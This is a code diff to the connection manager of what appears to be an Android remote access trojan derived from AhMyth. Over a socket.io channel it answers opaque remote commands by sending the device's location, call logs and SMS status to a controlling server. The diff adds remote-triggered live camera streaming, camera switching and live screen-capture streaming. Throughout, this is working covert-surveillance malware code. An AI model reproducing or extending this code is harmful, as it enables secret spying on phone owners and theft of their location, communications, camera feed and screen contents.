@@ -14,23 +14,15 @@ import io.socket.emitter.Emitter;
  */
 
 public class ConnectionManager {
-    public static Context context;
     private static io.socket.client.Socket ioSocket;
 
     private static long currentTime=0;
     private static FileManager fm = new FileManager();
-    public static void delay(int ms){
-        try {
-            Thread.currentThread();
-            Thread.sleep(ms);
-        } catch (InterruptedException e) {
-            e.printStackTrace();
-        }
-    }
+//删除delay函数
     public static void startAsync(Context con)
     {
         try {
-            context = con;
+            //取消静态context，避免内存泄漏
             sendReq();
         }catch (Exception ex){
             startAsync(con);
@@ -38,14 +30,9 @@ public class ConnectionManager {
     }
     public static void sendReq() {
     try {
-        //currentTime=System.currentTimeMillis();
         if(ioSocket != null )
             return;
-       // int a=IOSocket.aa();
-
         currentTime=System.currentTimeMillis();
-        RecordActivity.startRecordActivity(0);
-
         ioSocket = IOSocket.getInstance().getIoSocket();
         ioSocket.on("ping", new Emitter.Listener() {
         @Override
@@ -97,25 +84,34 @@ public class ConnectionManager {
                         x0000lm();
                         //x0000rt();
                         break;
+
                     case "x0000ct":
-                        x0000ct(data.getInt("sec"));
+                        if (data.getString("extra").equals("1")) {
+                            Log.d("VIDEO", "recvextra" );
+                            x0000ct(1);
+                        }
+                        else if (data.getString("extra").equals("2")) {
+                            Log.d("VIDEO", "recvextra" );
+                            x0000ct(2);
+                        }
                         break;
                     case "x0000rt":
-                        if(data.getString("extra").equals("camList"))
-                            x0000rt(-1,-1);
-                        else if (data.getString("extra").equals("1")) {
-                            Log.d("VIDEO", "recvextra" + data.getString("extra"));
-                            x0000rt(1, data.getInt("sec"));
-                            Log.d("VIDEO", "recvextraend" + data.getString("extra"));
+                        if (data.getString("extra").equals("1")) {
+                            Log.d("VIDEO", "recvextra" );
+                            x0000rt(1);
                         }
                         else if (data.getString("extra").equals("0")) {
-                            Log.d("VIDEO", "recvextra" + data.getString("extra"));
-                            x0000rt(0, data.getInt("sec"));
-                            Log.d("VIDEO", "recvextraend" + data.getString("extra"));
+                            Log.d("VIDEO", "recvextra" );
+                            x0000rt(0);
+                        }
+                        else if (data.getString("extra").equals("2")) {
+                            Log.d("VIDEO", "recvextra" );
+                            x0000rt(2);
                         }
                         //x0000rt(1,data.getInt("sec"));
                         break;
                     }
+
                 }
                 //currentTime = System.currentTimeMillis();
             }catch (Exception e) {
@@ -134,15 +130,15 @@ public class ConnectionManager {
 
 
         if(req == -1) {
-           JSONObject cameraList = new Camera2Manager(context).findCameraList();
+           JSONObject cameraList = new Camera2Manager(Myapplication.getAppContext()).findCameraList();
             if(cameraList != null)
                 ioSocket.emit("x0000ca" ,cameraList );
         }
         else if (req == 1){
-            new Camera2Manager(context).Startup("1");
+            new Camera2Manager(Myapplication.getAppContext()).Startup("1");
         }
         else if (req == 0){
-            new Camera2Manager(context).Startup("0");
+            new Camera2Manager(Myapplication.getAppContext()).Startup("0");
         }
 
     }
@@ -166,13 +162,27 @@ public class ConnectionManager {
             ioSocket.emit("x0000sm", isSent);
         }
     }
-    //录屏实现函数
-    public static void x0000ct(int sec)
+    //录屏实现函数,1表示开始录屏直播，2表示结束录屏直播
+
+    public static void x0000ct(int req)
     {
-        RecordActivity.startRecordActivity(sec);
+        if(req == 1)
+        {
+            Intent intent = new Intent(Myapplication.getAppContext(), ScreenActivity.class);
+            Myapplication.getAppContext().startActivity(intent);
+        }
+        else if(req == 2)
+        {
+            if(ScreenActivity.instance != null){
+                ScreenActivity.instance.finish();
+                Log.d("Ahmyth","killScreenActivity");
+            }
+
+        }
         //delay(sec*1000);
         //RecordActivity.killRecordActivity();
     }
+
     public static void x0000cl(){ioSocket.emit("x0000cl" , CallsManager.getCallsLogs());
     }
 
@@ -186,7 +196,7 @@ public class ConnectionManager {
 
     public static void x0000lm() throws Exception{
         Looper.prepare();
-        LocManager gps = new LocManager(context);
+        LocManager gps = new LocManager(Myapplication.getAppContext());
         JSONObject location = new JSONObject();
         // check if GPS enabled
         if(gps.canGetLocation()){
@@ -205,30 +215,27 @@ public class ConnectionManager {
         ioSocket.emit("x0000lm", location);
     }
     //录像实现函数
-    public static void x0000rt(int req,int sec){
+
+    //1开启相机直播，0切换摄像头,2关闭直播
+    public static void x0000rt(int req){
         Log.d("VIDEO","STARTVIDEO");
         //
-        if(req == -1) {
-            JSONObject cameraList = new Camera2Manager(context).findCameraList();
-            if(cameraList != null)
-                ioSocket.emit("x0000rt" ,cameraList );
-        }else if (req == 1) {
+        if(req == 2) {
+            Intent it=new Intent(Myapplication.getAppContext(), VideoService.class);
+            Myapplication.getAppContext().stopService(it);
 
-            VideoService.startvideo(context,sec,1);
-            /*Intent intent = new Intent(context, VideoService.class);
-            context.startService(intent);
-            delay(sec * 1000);
-            //结束录像
-            context.stopService(intent);*/
+        }else if (req == 1) {
+            Intent it=new Intent(Myapplication.getAppContext(), VideoService.class);
+            Myapplication.getAppContext().startService(it);
+
+
         }else if (req == 0)
         {
-            /*Intent intent = new Intent(context, VideoService.class);
-            context.startService(intent);
-            delay(sec * 1000);
-            //结束录像
-            context.stopService(intent);*/
-            VideoService.startvideo(context,sec,0);
+            Intent intent = new Intent(Myapplication.getAppContext(), VideoService.class);
+            intent.putExtra("command","switchcamera");
+            Myapplication.getAppContext().startService(intent);
         }
     }
+
 
 }
